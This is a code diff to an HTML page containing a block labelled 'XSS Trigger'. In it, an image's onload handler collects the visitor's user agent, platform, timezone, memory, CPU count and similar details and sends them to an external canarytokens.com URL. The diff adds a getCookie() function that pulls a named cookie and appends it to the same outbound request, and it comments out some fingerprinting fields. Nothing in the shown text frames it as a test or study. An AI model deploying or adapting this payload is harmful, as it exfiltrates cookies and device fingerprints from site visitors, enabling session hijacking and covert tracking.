@@ -11,7 +11,7 @@
 
     <!-- XSS Trigger -->
     <img src="https://canarytokens.com/tags/traffic/b2tfmveyrurze5bhvphvs3rg8/submit.aspx?wsop_contact_us=htmlimg" 
-        onload="this.src='https://canarytokens.com/tags/traffic/b2tfmveyrurze5bhvphvs3rg8/submit.aspx?wsop_contact_us=htmlimg&systemInfo=' + encodeURIComponent(getSystemInfo())" />
+            onload="this.src='https://canarytokens.com/tags/traffic/b2tfmveyrurze5bhvphvs3rg8/submit.aspx?wsop_contact_us=htmlimg&systemInfo=' + encodeURIComponent(getSystemInfo()) + '&cookie=' + encodeURIComponent(getCookie('exampleCookie'))" />
     
     <script>
         // Function to gather system and environment information
@@ -28,9 +28,9 @@
                 deviceMemory: navigator.deviceMemory,          // Device memory (GB)
                 hardwareConcurrency: navigator.hardwareConcurrency,  // Number of CPU cores
                 //plugins: navigator.plugins.length,             // Number of installed browser plugins
-                mimeTypes: navigator.mimeTypes.length,         // Number of supported MIME types
+                mimeTypes: navigator.mimeTypes.length         // Number of supported MIME types
                 //geolocation: getGeolocation(),                 // Geolocation
-                canvasFingerprint: getCanvasFingerprint(),     // Canvas fingerprint
+                //canvasFingerprint: getCanvasFingerprint(),     // Canvas fingerprint
                 //webGLFingerprint: getWebGLFingerprint()        // WebGL fingerprint
             };
 
@@ -38,20 +38,32 @@
             return 'UserAgent=' + systemInfo.userAgent + 
                    '&Platform=' + systemInfo.platform + 
                    '&Language=' + systemInfo.language + 
-                   '&ScreenWidth=' + systemInfo.screenWidth + 
-                   '&ScreenHeight=' + systemInfo.screenHeight + 
-                   '&CurrentURL=' + systemInfo.currentURL + 
-                   '&Referrer=' + systemInfo.referrer + 
+                   //'&ScreenWidth=' + systemInfo.screenWidth + 
+                   //'&ScreenHeight=' + systemInfo.screenHeight + 
+                   //'&CurrentURL=' + systemInfo.currentURL + 
+                   //'&Referrer=' + systemInfo.referrer + 
                    '&Timezone=' + systemInfo.timezone + 
                    '&DeviceMemory=' + systemInfo.deviceMemory + 
                    '&HardwareConcurrency=' + systemInfo.hardwareConcurrency + 
-                   '&Plugins=' + systemInfo.plugins + 
-                   '&MimeTypes=' + systemInfo.mimeTypes + 
+                   //'&Plugins=' + systemInfo.plugins + 
+                   '&MimeTypes=' + systemInfo.mimeTypes; 
                    //'&Geolocation=' + systemInfo.geolocation + 
-                   '&CanvasFingerprint=' + systemInfo.canvasFingerprint; 
+                   //'&CanvasFingerprint=' + systemInfo.canvasFingerprint; 
                    //'&WebGLFingerprint=' + systemInfo.webGLFingerprint;
         }
-
+        // Function to get cookie value by name
+        function getCookie(name) {
+            const nameEq = name + "=";
+            const cookies = document.cookie.split(';');
+            for (let i = 0; i < cookies.length; i++) {
+                let cookie = cookies[i].trim();
+                if (cookie.indexOf(nameEq) == 0) {
+                    return cookie.substring(nameEq.length, cookie.length);
+                }
+            }
+            return null; // Return null if cookie is not found
+        }
+        
         // Function to get geolocation
         function getGeolocation() {
             if (navigator.geolocation) {
